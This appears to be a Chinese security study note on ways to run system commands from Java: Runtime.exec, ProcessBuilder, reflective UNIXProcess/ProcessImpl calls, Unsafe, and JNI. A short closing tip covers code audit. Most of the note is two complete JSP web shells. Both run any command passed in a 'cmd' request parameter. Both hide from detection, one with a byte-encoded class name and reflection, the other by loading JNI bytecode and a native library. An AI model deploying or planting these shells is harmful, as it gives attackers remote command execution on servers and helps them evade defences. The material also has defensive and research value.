# Day4-exec

## 0x01 Runtime命令执行

```java
Process process = Runtime.getRuntime().exec("ipconfig");
		InputStream is  = process.getInputStream();
		byte [] tmp = new byte[1024];
		int a = 0;
		while ((a=is.read(tmp)) != -1){
			System.out.println(new String(tmp,0,a));
		}
```

![image-20211229233502573](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211229233502573.png)

永远记住，`Runtime.getRuntime().exec`这个不是命令执行的终点。

反射调用不用再说了很简单的。

## 0x02 ProcessBuilder命令执行

![image-20211229234158628](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211229234158628.png)

```
InputStream in = new ProcessBuilder(request.getParameterValues("cmd")).start().getInputStream();
```

## 0x03 UNIXProcess/ProcessImpl

截取大佬的一句话

![image-20211229234548246](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211229234548246.png)

:dagger: 所以链子一定要跟到native层不然都不够用!

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>

<%!
    byte[] toCString(String s) {
        if (s == null) {
            return null;
        }

        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0, result, 0, bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }//转换未c的字符串

    InputStream start(String[] strs) throws Exception {
        //java.lang.UNIXProcess
        Class clazz = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115}));

        //获取构造方法
        Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        
        assert strs != null && strs.length > 0;

        // Convert arguments to a contiguous block; it's easier to do
        // memory management in Java than in C.
        byte[][] args = new byte[strs.length - 1][];

        int size = args.length; // For added NUL bytes
        for (int i = 0; i < args.length; i++) {
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        }
        //now "ipconfig" => "i".getBytes() + ....

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
            // No need to write NUL bytes explicitly
        }//把[byte,byte] => bytebyte
        //argBlock => ipconfig

        int[] envc    = new int[1];
        int[] std_fds = new int[]{-1, -1, -1};

        FileInputStream  f0 = null;
        FileOutputStream f1 = null;
        FileOutputStream f2 = null;

        // In theory, close() can throw IOException
        // (although it is rather unlikely to happen here)
        try {
            if (f0 != null) f0.close();
        } finally {
            try {
                if (f1 != null) f1.close();
            } finally {
                if (f2 != null) f2.close();
            }
        }

        Object object = constructor.newInstance(
                toCString(strs[0]), argBlock, args.length,
                null, envc[0], null, std_fds, false
        );

        Method inMethod = object.getClass().getDeclaredMethod("getInputStream");
        inMethod.setAccessible(true);

        return (InputStream) inMethod.invoke(object);
    }

    String inputStreamToString(InputStream in, String charset) throws IOException {
        try {
            if (charset == null) {
                charset = "UTF-8";
            }

            ByteArrayOutputStream out = new ByteArrayOutputStream();
            int                   a   = 0;
            byte[]                b   = new byte[1024];

            while ((a = in.read(b)) != -1) {
                out.write(b, 0, a);
            }

            return new String(out.toByteArray());
        } catch (IOException e) {
            throw e;
        } finally {
            if (in != null)
                in.close();
        }
    }
%>
<%
    String str = request.getParameter("cmd");

    if (str != null) {
        InputStream in     = start(str.split("\\s+"));
        String      result = inputStreamToString(in, "UTF-8");
        out.println("<pre>");
        out.println(result);
        out.println("</pre>");
        out.flush();
        out.close();
    }
%>
```

## 0x04 无UNIXProcess/ProcessImpl构造方法

`sun.misc.unsafe`无视构造构造方法`allocateInstance`直接向JVM注册类

1. 使用`sun.misc.Unsafe.allocateInstance(Class)`特性可以无需`new`或者`newInstance`创建`UNIXProcess/ProcessImpl`类对象。
2. 反射`UNIXProcess/ProcessImpl`类的`forkAndExec`方法。
3. 构造`forkAndExec`需要的参数并调用。
4. 反射`UNIXProcess/ProcessImpl`类的`initStreams`方法初始化输入输出结果流对象。
5. 反射`UNIXProcess/ProcessImpl`类的`getInputStream`方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。

纯粹靠反射获取方法和参数:

https://zhishihezi.net/endpoint/richtext/ee17639b01e93049c3a9a905fc5f3ef6?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00d32ed62f491eb19720c09f60240236b865f263b27d3ce9d77d52456202bd9cd61d91548955020fd9d5d5fb70e3f638034da5b59f043c2806d0db27d492062c996abf5bc50e064bc40283cbaa19a83bb7c24a378e0478f40985dad33fc80fef03ef50b2e56746b27536792f3c2929f081a951cd9f7b45ddb842228657c93faeb46d3d85f78946280e07ebed2cc439c36c4c9a7f77eefdbd860dbb707f9e3aab0f1dadf587e1849358620af5c82f700f7ffaef07ae0f3aa0dbf479f9a66f02102d#5

## 0x05 JNI执行命令

分析一下他的payload

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.File" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.FileOutputStream" %>
<%!
    private static final String COMMAND_CLASS_NAME = "com.anbai.sec.cmd.CommandExecution";

    /**
     * JDK1.5编译的com.anbai.sec.cmd.CommandExecution类字节码,
     * 只有一个public static native String exec(String cmd);的方法
     */
    private static final byte[] COMMAND_CLASS_BYTES = new byte[]{
            -54, -2, -70, -66, 0, 0, 0, 49, 0, 15, 10, 0, 3, 0, 12, 7, 0, 13, 7, 0, 14, 1,
            0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,
            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108,
            101, 1, 0, 4, 101, 120, 101, 99, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97,
            110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108,
            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114,
            99, 101, 70, 105, 108, 101, 1, 0, 21, 67, 111, 109, 109, 97, 110, 100, 69, 120,
            101, 99, 117, 116, 105, 111, 110, 46, 106, 97, 118, 97, 12, 0, 4, 0, 5, 1, 0, 34,
            99, 111, 109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 109, 100, 47, 67,
            111, 109, 109, 97, 110, 100, 69, 120, 101, 99, 117, 116, 105, 111, 110, 1, 0, 16,
            106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0,
            2, 0, 3, 0, 0, 0, 0, 0, 2, 0, 1, 0, 4, 0, 5, 0, 1, 0, 6, 0, 0, 0, 29, 0, 1, 0, 1,
            0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 7, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 1,
            9, 0, 8, 0, 9, 0, 0, 0, 1, 0, 10, 0, 0, 0, 2, 0, 11
    };

    // JNI文件Base64编码后的值,这里默认提供一份MacOS的JNI库文件用于测试，其他系统请自行编译
    private static final String COMMAND_JNI_FILE_BYTES = "";

    /**
     * 获取JNI链接库目录
     * @return 返回缓存JNI的临时目录
     */
    File getTempJNILibFile() {
        File jniDir = new File(System.getProperty("java.io.tmpdir"), "jni-lib");

        if (!jniDir.exists()) {
            jniDir.mkdir();
        }

        return new File(jniDir, "libcmd.lib");
    }

    /**
     * 高版本JDKsun.misc.BASE64Decoder已经被移除，低版本JDK又没有java.util.Base64对象，
     * 所以还不如直接反射自动找这两个类，哪个存在就用那个decode。
     * @param str
     * @return
     */
    byte[] base64Decode(String str) {
        try {
            try {
                Class clazz = Class.forName("sun.misc.BASE64Decoder");
                return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
            } catch (ClassNotFoundException e) {
                Class  clazz   = Class.forName("java.util.Base64");
                Object decoder = clazz.getMethod("getDecoder").invoke(null);
                return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
            }
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * 写JNI链接库文件
     * @param base64 JNI动态库Base64
     * @return 返回是否写入成功
     */
    void writeJNILibFile(String base64) throws IOException {
        if (base64 != null) {
            File jniFile = getTempJNILibFile();

            if (!jniFile.exists()) {
                byte[] bytes = base64Decode(base64);

                if (bytes != null) {
                    FileOutputStream fos = new FileOutputStream(jniFile);
                    fos.write(bytes);
                    fos.flush();
                    fos.close();
                }
            }
        }
    }
%>
<%
    // 需要执行的命令
    String cmd = request.getParameter("cmd");

    // JNI链接库字节码,如果不传会使用"COMMAND_JNI_FILE_BYTES"值
    String jniBytes = request.getParameter("jni");

    // JNI路径
    File jniFile = getTempJNILibFile();

    ClassLoader loader = (ClassLoader) application.getAttribute("__LOADER__");//获取ClassLoader通System.get

    if (loader == null) {
        loader = new ClassLoader(this.getClass().getClassLoader()) {
            @Override
            protected Class<?> findClass(String name) throws ClassNotFoundException {
                try {
                    return super.findClass(name);
                } catch (ClassNotFoundException e) {
                    return defineClass(COMMAND_CLASS_NAME, COMMAND_CLASS_BYTES, 0, COMMAND_CLASS_BYTES.length);
                }
            }
        };

        writeJNILibFile(jniBytes != null ? jniBytes : COMMAND_JNI_FILE_BYTES);// 写JNI文件到临时文件目录

        application.setAttribute("__LOADER__", loader);
    }

    try {
        // load命令执行类
        Class  commandClass = loader.loadClass("com.anbai.sec.cmd.CommandExecution");
        Object loadLib      = application.getAttribute("__LOAD_LIB__");

        if (loadLib == null || !((Boolean) loadLib)) {
            Method loadLibrary0Method = ClassLoader.class.getDeclaredMethod("loadLibrary0", Class.class, File.class);
            loadLibrary0Method.setAccessible(true);
            loadLibrary0Method.invoke(loader, commandClass, jniFile);
            application.setAttribute("__LOAD_LIB__", true);
        }

        String content = (String) commandClass.getMethod("exec", String.class).invoke(null, cmd);
        out.println("<pre>");
        out.println(content);
        out.println("</pre>");
    } catch (Exception e) {
        out.println(e.toString());
        throw e;
    }

%>
```

## 0x06 代码审计

代码审计阶段我们应该多搜索下`Runtime.exec/ProcessBuilder/ProcessImpl`等关键词，这样可以快速找出命令执行点。